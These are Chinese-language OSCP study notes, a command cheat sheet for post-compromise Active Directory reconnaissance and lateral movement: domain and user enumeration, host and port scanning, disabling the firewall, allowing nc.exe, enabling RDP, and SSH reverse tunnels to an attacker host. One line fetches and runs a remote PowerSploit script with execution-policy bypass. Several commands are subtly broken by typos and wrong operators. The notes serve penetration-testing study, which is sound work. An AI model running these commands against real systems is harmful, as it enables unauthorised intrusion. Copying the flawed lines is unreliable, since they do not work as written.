# OSCP
枚举用户，用户组
  net user
  net user /domain --- filter
PowerShell
  LDAP://HostName[:PortNumber][/DistinguishedName]
  [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
  $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() 储存整个域对象
  $PDC = ($domainObj.PdcRoleOwner).Name 存储PDC名字
  $SearchString = "LDAP://" 构建路径
  $SearchString +- $PDC + "/" 构建路径
  $DistinguishedName = "DC-$($domainObj.Name.Replace('_', ',DC-'))" 将DomainName单独分解
  $SearchString +-$DistinguishedName 构建路径
  $SearchString 构建路径
  $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
  $objDomain = New-Object System.DirectoryServices.DirectoryEntry
  $Searcher.SearchRoot = $objDomain
  $Searcher.filter = "samAccountType-80530638"
  $Searcher.FindAll() or
Foreach($objj in $Result)
{
  Foreach($prop in $obj.Properties)
  {
    $prop
  }
  Write-Host "--------------------------------------"
}
收集所有用户及其属性。
图片: https://uploader.shimo.im/f/QIfXSDg3gYGYHLNY.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2ODAxODM4NTAsImZpbGVHVUlEIjoibTRrTUx3Sk12R2NZYmpxRCIsImlhdCI6MTY4MDE4MzU1MCwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo3NDY0NDcxOH0._mHFUWTHqdOXMVHGPKSRUmU5NDgp_qcmo9U9MmHH4r4
攻击顺序 Bob --> Alice --> Jeff
Get-NetLoggedon -ComputerName client251 --- 列出已登录的用户
Get-NetSession --- 列出active session
Active Directory Authentication
ntlm --- 通过IP地址认证
Calculate NTLM has
Username
Nonce
Response (Encrypted nonce)
Response, username and nonce
Encrypt nonce with NTLM hash of user and compare to response
Approve authentication
图片: https://uploader.shimo.im/f/hle9V5KFlZomVI06.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2ODAxODM4NTAsImZpbGVHVUlEIjoibTRrTUx3Sk12R2NZYmpxRCIsImlhdCI6MTY4MDE4MzU1MCwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo3NDY0NDcxOH0._mHFUWTHqdOXMVHGPKSRUmU5NDgp_qcmo9U9MmHH4r4
mimikatz
http://vulnstack.qiyuanxuetang.net/vuln/detail/3/
https://www.c0bra.xyz/2019/12/08/%E5%9F%9F%E6%B8%97%E9%80%8F-Vulnstack%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/

信息搜集
查询操作系统和版本信息
查看系统体系架构
echo %PROCESSOR_ARCHITECTURE%
查看安装的软件及版本、路径等
wmic product get name, version
powershell "Get-WmiObject -class Win32_Product | Select-Object -Property name,version"
查询本机服务信息
wmic service list brief
查询进程列表 --- 可以查看当前进程列表和进程用户，分析软件、邮件客户端、VPN、杀软等进程
tasklist
tasklist /svc
wmic process list brief
查看启动程序信息
查看计划任务
schtasks /query /fo LIST /v
查看主机开机时间
查看用户列表 --- 通过分析本机用户列表，可以找出内网机器的命名规则。特别是个人机器的名称，可以用来推测整个域的用户命名方式。
net user
执行如下命令可以获取本地管理员信息，通常会包含域用户，可以看到有两个用户和一个组，默认Domain Admins组里为域内机器的本地管理员用户。在真实环境中为了方便管理，会有域用户被添加为域及其的本地管理员用户。
net localgroup administrators
执行如下命令可以查看当前在线的用户
query user || qwinsta
query session
查询端口列表 --- 可先通过网路连接初步判断（例如，在代理服务器中很可能会有很多机器开放了代理端口，更新服务器可能开放了更新端口 8530，DNS 服务器可能开启了 53 端口等），再根据其他信息进行综合判断。
netstat -ano
查看补丁列表
systeminfo
需要注意系统版本、位数、域、补丁信息及更新频率等，域内主机的补丁通常是批量安装的，通过查看本地补丁列表，就可以找到未打补丁的漏洞。可以看到本机只安装了3个补丁。
wmic qfe get Caption,Description,HotFixID,InstalledOn //使用wmic也可以查看安装在系统中的补丁
查询本机共享列表
net share
wmic share get name,path,status //利用 wmic 命令查找共享列表：
查询路由表和ARP缓存表
route print
arp -a
防火墙相关配置
#关闭防火墙
netsh firewall set opmode disable // winserver2003及之前的版本
netsh advfirewall set allprofiles state off //winserver2003之后的版本
查看防火墙配置
netsh firewall show config
修改防火墙配置
允许指定程序进入
#Windows Server 2003及之前版本
netsh firewall add allowedprogram c:\nc.exe "allow nc" enable  

#Windows Server 2003以后版本
netsh advfirewall firewall add rule name="pass nc" dir=in action=allow program="C:\nc.exe"         
允许指定程序退出
netsh advfirewall firewall add rule name="Allownc" dir=out action=allow program="C:\nc.exe"
允许3389端口放行
netsh advfirewall firewall add rule name="Remote Desktop"  protocol=TCP dir=in localport=3389 action=allow
自定义防火墙日志的存储位置
netsh avdfirewall set currentprofile logging filename "C:\xx.log"
查询远程连接端口并开启RDP
reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /V PortNumber //查询端口为多少
开启3389的RDP服务
#Windows Server 2003
wmic path win32_terminalservicesetting where (__CLASS != "") call setallowtsconnections 1

#Windows Server 2008/2012
wmic /namesapce:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS != "") call setallowtsconnections 1

wmic /namesapce:\\root\cimv2\terminalservices path win32_terminalservicesetting where (TerminalName != "RDP-Tcp") call setuserauthenticationrequired 1

reg add "HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f
wmic脚本
for /f "delims=" %%A in ('dir /s /b %WINDIR%\system32\*htable.xsl') do set "var=%%A"
wmic process get CSName,Description,ExecutablePath,ProcessId /format:"%var%" >> out.html
wmic service get Caption,Name,PathName,ServiceType,Started,StartMode,StartName /format:"%var%" >> out.html
wmic USERACCOUNT list full /format:"%var%" >> out.html
wmic group list full /format:"%var%" >> out.html
wmic nicconfig where IPEnabled='true' get Caption,DefaultIPGateway,Description,DHCPEnabled,DHCPServer,IPAddress,IPSubnet,MACAddress /format:"%var%" >> out.html
wmic volume get Label,DeviceID,DriveLetter,FileSystem,Capacity,FreeSpace /format:"%var%" >> out.html
wmic netuse list full /format:"%var%" >> out.html
wmic qfe get Caption,Description,HotFixID,InstalledOn /format:"%var%" >> out.html
wmic startup get Caption,Command,Location,User /format:"%var%" >> out.html
wmic PRODUCT get Description,InstallDate,InstallLocation,PackageCache,Vendor,Version /format:"%var%" >> out.html
wmic os get name,version,InstallDate,LastBootUpTime,LocalDateTime,Manufacturer,RegisteredUser,ServicePackMajorVersion,SystemDirectory /format:"%var%" >> out.html
wmic Timezone get DaylightName,Description,StandardName /format:"%var%" >> out.html
Empire --- 使用empire的winenum或者computerdetails模块都可以很好去收集本机的一些信息
https://github.com/BC-SECURITY/Empire

查看当前权限
whoami
获取域SID
whoami /all
查询指定用户的详细信息
net user xxx /domain
判断是否存在域
ipconfig /all //查看下网关地址、DNS的IP、本机是否和DNS的IP一个网段等
nslookup //通过反向解析查询命令nslookup来解析域名的IP，得到IP后对比域控和DNS服务器是否为同一台主机
查询当前登录域及登录用户信息
net config workstation
判断主域
net time /domain
存在域，且当前用户是域用户
图片: https://uploader.shimo.im/f/HZuP5Feux0gTxZoP.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2ODAxODM4NTAsImZpbGVHVUlEIjoibTRrTUx3Sk12R2NZYmpxRCIsImlhdCI6MTY4MDE4MzU1MCwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo3NDY0NDcxOH0._mHFUWTHqdOXMVHGPKSRUmU5NDgp_qcmo9U9MmHH4r4
存在域，但当前用户不是域用户
图片: https://uploader.shimo.im/f/SwvlXZEFc61uCMIB.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2ODAxODM4NTAsImZpbGVHVUlEIjoibTRrTUx3Sk12R2NZYmpxRCIsImlhdCI6MTY4MDE4MzU1MCwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo3NDY0NDcxOH0._mHFUWTHqdOXMVHGPKSRUmU5NDgp_qcmo9U9MmHH4r4
不存在域
图片: https://uploader.shimo.im/f/fIxZKgS2uUDwRvG5.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2ODAxODM4NTAsImZpbGVHVUlEIjoibTRrTUx3Sk12R2NZYmpxRCIsImlhdCI6MTY4MDE4MzU1MCwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo3NDY0NDcxOH0._mHFUWTHqdOXMVHGPKSRUmU5NDgp_qcmo9U9MmHH4r4

探测域内存活主机
利用NetBIOS协议 --- NetBIOS 是局域网程序使用的一种应用程序编程接口（API），为程序提供了请求低级别服务的统一命令集，为局域网提供了网络及其他特殊功能。几乎所有的局域网都是建立在 NetBIOS 协议基础上工作的。NetBIOS 也是计算机的标识名，主要用于局域网中计算机的互访。 NetBIOS 的工作流程就是正常的机器名解析查询应答过程，因此推荐优先使用。
nbtscan是一个扫描 Windows 网络 NetBIOS 信息的小工具，身材娇小，简单快速，但只能用于局域网，可以显示 IP，主机名，用户名称和 MAC 地址等等。nbtscan 有 Windows 和 Linux 两个版本，体积小，不需要安装特殊的库或 DLL 即可运行，传到目标主机上可直接进行扫描。
http://www.unixwiz.net/tools/nbtscan.html

利用ICMP协议 --- 除了利用NetBIOS协议探测内网，还可以利用ICMP协议快速探测内网，用的就是我们平时最常用的ping目录
for /L %I in (1, 1, 254) DO @ping -w 1 -n 1 10.10.10.%I | findstr "TTL="
# /L参数指定以增量方式从开始到结束的一个数字序列，(1,1,254)从1开始，步长为1，最大到254
# -w指的是等待时间为1s
# -n指的是发送一次

利用ARP协议
arp-scan.exe -t 10.10.10.0/24
https://github.com/QbsuranAlang/arp-scan-windows-/tree/master/arp-scan
可以使用empire中的arpscan模块

利用TCP/UDP端口扫描
scanline -h -t 22,80-89,110,389,445,3389,1099,1433,2049,6379,7001,8080,1521,3306,3389,5432 -u 53,161,137,139 -O c:\windows\temp\log.txt -p 192.168.1.1-254 /b

扫描域内端口
Telnet
telnet DC 3389
S 扫描器 --- S 扫描器是早期的一种快熟端口扫描工具，支持大网段扫描，特别适合运行在 Windows Server 2003 以下版本的操作系统中。
s.exe TCP 192.168.1.1 192.168.1.254 445,3389,1433,7001,1099,8080,80,21,22,23,25,110,3306,5432,6379,2049,111 256 /Banner /Save
MSF扫描 --- Metasploit
PowerSploit
# 无文件形式扫描
powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1'); Invoke-PortScan -Hosts 192.168.1.0/24 -T 4 -ports '80,445,1433,8080,3389' -oA C:\windows\temp\res.txt"
# 文件落地扫描
powershell.exe -exec bypass -Command "& {Import-Module C:\Users\001\Desktop\Invoke-PortScan.ps1; Invoke-PortScan -Hosts 192.168.1.0/24 -T 4 -ports '80,445,1433,8080,3389' -oA C:\Users\001\Desktop\res.txt }" 
Nishang
powershell.exe -exec bypass -Command "& {Import-Module C:\Users\001\Desktop\Invoke-PortScan.ps1; Invoke-PortScan -StartAddress 192.168.1.1 -EndAddress 192.168.1.254 -ResolveHost -ScanPort -TimeOut 500}" 

端口banner信息
文件共享服务端口
远程连接服务端口
Web应用服务端口
数据库服务端口
邮件服务端口
网络常见协议端口
特殊服务端口
收集域内信息
查询域
net view /domain
查询域内所有计算机
net view /domain:de1ay
# 可通过主机名对主机角色将进行初步判断，dev 可能为开发服务器、web、app 可能为 Web 服务器、NAS 可能为存储服务器、fileserver 可能为文件服务器等。
域内所有用户列表
net group /domain
系统自带的常见用户身份
Domain Admins：域管理员
Domain Computers：域内机器
Domain Controllers：域控制器
Domain Guest：域访客
Enterprise Admins：企业系统管理员用户
在默认情况下 Domain Admins 和 Enterprise Admins 对域内所有域控制器有完全控制权限。

域成员计算机列表
net group "Domain Computers" /domain
获取域密码信息
net accounts /domain
获取域信任信息
nltest /domain_trusts

查找域控
域控机器名
nltest /DCLIST:de1ay

netdom query pdc
域控主机名
nslookup -type=SRV _ldap._tcp
当前时间
net time  /domain
域控制器组 --- 在实际网络中，一个域内一般存在两台或两台以上的域控制器，一旦主域控制器发生故障，备用的域控制器就可以保证域内的服务和验证工作正常进行。
net group "Domain Controllers" /domain

域内用户与管理员
所有域用户列表
#向域控制器进行查询
net user /domain

#获取域内用户的详细信息
wmic useraccount get /all

#查看存在的用户
dsquery user

#查询本地管理员用户
net localgroup administrators

域管理员用户组
net group "domain admins" /domain------------查询域管理员用户
net group "Enterprise Admins" /domain-----------查询管理员用户组

创建SSH隧道常用参数如下：
-C：压缩传输提高效率
-f：将SSH传输转入后台运行
-N：建立静默连接，连接主机后不打开shell
-g：允许远程主机连接本地用于转发的端口
-L：本地端口转发
-R：远程端口转发
-D：动态转发（socks代理）
-P：指定SSH端口

远程端口转发
远程转发场景如下：假设host2为外网打点拿到的主机，host1是攻击者的公网主机，host3是内网主机。内网中的主机host3无法直接访问host1，必须要借助host2来进行转发。
但是出现了一个问题，host1无法ssh访问host2，但是host2可以ssh访问host1，host2和host3可以互相访问，这种情况下就登录不上host2了。
所以我们要在host2上进行远程端口转发，在host2上执行如下命令：
ssh -CfNg -R 9876:host3:3389 host1
ssh -CfNg -R X:host3:Y host1
将对于远程主机host1—X端口的访问，通过本地host2转换为，对host3—Y端口的访问

区分本地端口转发和远程端口转发
本地转发：应用连接方向：host1->host2->host3 ssh连接方向：host1->host2 方向一致
远程转发：应用连接方向：host1->host2->host3 ssh连接方向：host2->host1 方向相反
